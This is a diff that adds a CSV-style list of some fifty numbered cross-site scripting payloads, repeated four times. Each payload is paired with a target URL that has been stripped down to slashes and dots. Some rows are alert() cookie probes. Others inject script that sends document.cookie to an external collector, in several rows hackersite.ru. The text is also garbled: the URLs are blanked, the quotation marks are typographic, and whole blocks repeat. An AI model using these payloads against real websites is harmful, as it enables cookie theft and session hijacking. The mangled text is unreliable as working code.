@@ -1,0 +1,204 @@
+0,JS,: / / / ? = ><script>alert(«cookie: «+document.cookie)</script>
+1,JS,: / / . . / / ><script>alert(«cookie: «+document.cookie)</script>
+2,JS,: / / . . / / / ><script>alert(«cookie: «+document.cookie)</script>
+3,JS,: / / . / . .  ><script>alert(«cookie: «+document.cookie)</script>
+4,JS,: / / . / ><script>alert(«cookie: «+document.cookie)</script>
+5,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+6,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+7,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+8,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+9,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+10,JS,: / / . / / / = "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+11,JS,: / / . . / ? = _ "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+12,JS,: / / . / / / / / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+13,JS,: / / . / / / / / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+14,JS,: / / . / / / / / "><script>var img=new Image();img.src=""?""+ encodeURI(document.cookie);</script>"
+15,JS,: / / . / / / / / "><script>var img=new Image();img.src=?+ encodeURI(document.cookie);</script>"
+16,JS,: / / . / / / / / "><script>var img=new Image();img.src=?+ encodeURI(document.cookie);</script>"
+17,JS,: / / . / / / " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+18,JS,: / / . / / / / / "><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+19,JS,: / / . / / / = " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+20,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+21,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+22,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+23,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+24,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+25,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+26,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+27,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+28,JS,: / / . / / / " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+29,JS,: / / . . / ? = - ><script>alert(«cookie: «+document.cookie)</script>
+30,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+31,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+32,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+33,JS,: / / . / / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+34,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+35,JS,: / / . / / / / / _ / ><script>alert(«cookie: «+document.cookie)</script>
+36,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+37,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+38,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+39,JS,: / / . / / / = " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+40,JS,: / / . . / ? = _ " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+41,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+42,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+43,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+44,JS,: / / . / / / / / _ / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+45,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+46,JS,: / / . / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+47,JS,: / / . / / / / /"><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+48,JS,: / / . / / / = "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+49,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+50,JS,: / / . / / / / / _ / ><script>alert(«cookie: «+document.cookie)</script>
+0,JS,: / / / ? = ><script>alert(«cookie: «+document.cookie)</script>
+1,JS,: / / . . / / ><script>alert(«cookie: «+document.cookie)</script>
+2,JS,: / / . . / / / ><script>alert(«cookie: «+document.cookie)</script>
+3,JS,: / / . / . .  ><script>alert(«cookie: «+document.cookie)</script>
+4,JS,: / / . / ><script>alert(«cookie: «+document.cookie)</script>
+5,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+6,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+7,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+8,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+9,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+10,JS,: / / . / / / = "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+11,JS,: / / . . / ? = _ "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+12,JS,: / / . / / / / / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+13,JS,: / / . / / / / / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+14,JS,: / / . / / / / / "><script>var img=new Image();img.src=""?""+ encodeURI(document.cookie);</script>"
+15,JS,: / / . / / / / / "><script>var img=new Image();img.src=?+ encodeURI(document.cookie);</script>"
+16,JS,: / / . / / / / / "><script>var img=new Image();img.src=?+ encodeURI(document.cookie);</script>"
+17,JS,: / / . / / / " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+18,JS,: / / . / / / / / "><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+19,JS,: / / . / / / = " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+20,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+21,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+22,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+23,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+24,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+25,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+26,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+27,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+28,JS,: / / . / / / " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+29,JS,: / / . . / ? = - ><script>alert(«cookie: «+document.cookie)</script>
+30,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+31,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+32,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+33,JS,: / / . / / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+34,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+35,JS,: / / . / / / / / _ / ><script>alert(«cookie: «+document.cookie)</script>
+36,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+37,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+38,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+39,JS,: / / . / / / = " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+40,JS,: / / . . / ? = _ " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+41,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+42,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+43,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+44,JS,: / / . / / / / / _ / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+45,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+46,JS,: / / . / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+47,JS,: / / . / / / / /"><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+48,JS,: / / . / / / = "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+49,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+50,JS,: / / . / / / / / _ / ><script>alert(«cookie: «+document.cookie)</script>
+0,JS,: / / / ? = ><script>alert(«cookie: «+document.cookie)</script>
+1,JS,: / / . . / / ><script>alert(«cookie: «+document.cookie)</script>
+2,JS,: / / . . / / / ><script>alert(«cookie: «+document.cookie)</script>
+3,JS,: / / . / . .  ><script>alert(«cookie: «+document.cookie)</script>
+4,JS,: / / . / ><script>alert(«cookie: «+document.cookie)</script>
+5,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+6,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+7,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+8,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+9,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+10,JS,: / / . / / / = "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+11,JS,: / / . . / ? = _ "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+12,JS,: / / . / / / / / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+13,JS,: / / . / / / / / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+14,JS,: / / . / / / / / "><script>var img=new Image();img.src=""?""+ encodeURI(document.cookie);</script>"
+15,JS,: / / . / / / / / "><script>var img=new Image();img.src=?+ encodeURI(document.cookie);</script>"
+16,JS,: / / . / / / / / "><script>var img=new Image();img.src=?+ encodeURI(document.cookie);</script>"
+17,JS,: / / . / / / " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+18,JS,: / / . / / / / / "><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+19,JS,: / / . / / / = " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+20,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+21,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+22,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+23,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+24,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+25,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+26,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+27,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+28,JS,: / / . / / / " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+29,JS,: / / . . / ? = - ><script>alert(«cookie: «+document.cookie)</script>
+30,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+31,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+32,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+33,JS,: / / . / / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+34,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+35,JS,: / / . / / / / / _ / ><script>alert(«cookie: «+document.cookie)</script>
+36,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+37,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+38,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+39,JS,: / / . / / / = " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+40,JS,: / / . . / ? = _ " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+41,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+42,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+43,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+44,JS,: / / . / / / / / _ / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+45,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+46,JS,: / / . / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+47,JS,: / / . / / / / /"><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+48,JS,: / / . / / / = "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+49,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+50,JS,: / / . / / / / / _ / ><script>alert(«cookie: «+document.cookie)</script>
+0,JS,: / / / ? = ><script>alert(«cookie: «+document.cookie)</script>
+1,JS,: / / . . / / ><script>alert(«cookie: «+document.cookie)</script>
+2,JS,: / / . . / / / ><script>alert(«cookie: «+document.cookie)</script>
+3,JS,: / / . / . .  ><script>alert(«cookie: «+document.cookie)</script>
+4,JS,: / / . / ><script>alert(«cookie: «+document.cookie)</script>
+5,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+6,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+7,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+8,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+9,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+10,JS,: / / . / / / = "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+11,JS,: / / . . / ? = _ "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+12,JS,: / / . / / / / / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+13,JS,: / / . / / / / / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+14,JS,: / / . / / / / / "><script>var img=new Image();img.src=""?""+ encodeURI(document.cookie);</script>"
+15,JS,: / / . / / / / / "><script>var img=new Image();img.src=?+ encodeURI(document.cookie);</script>"
+16,JS,: / / . / / / / / "><script>var img=new Image();img.src=?+ encodeURI(document.cookie);</script>"
+17,JS,: / / . / / / " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+18,JS,: / / . / / / / / "><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+19,JS,: / / . / / / = " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+20,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+21,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+22,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+23,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+24,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+25,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+26,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+27,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+28,JS,: / / . / / / " ><script>var img=new Image();img.src="http: / /hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+29,JS,: / / . . / ? = - ><script>alert(«cookie: «+document.cookie)</script>
+30,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+31,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+32,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+33,JS,: / / . / / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+34,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+35,JS,: / / . / / / / / _ / ><script>alert(«cookie: «+document.cookie)</script>
+36,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+37,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+38,JS,: / / . / / / ><script>alert(«cookie: «+document.cookie)</script>
+39,JS,: / / . / / / = " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+40,JS,: / / . . / ? = _ " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+41,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+42,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+43,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+44,JS,: / / . / / / / / _ / "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+45,JS,: / / . / / / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+46,JS,: / / . / / / " ><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+47,JS,: / / . / / / / /"><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+48,JS,: / / . / / / = "><script>var img=new Image();img.src="?"+ encodeURI(document.cookie);</script>"
+49,JS,: / / . / / / / / ><script>alert(«cookie: «+document.cookie)</script>
+50,JS,: / / . / / / / / _ / ><script>alert(«cookie: «+document.cookie)</script>
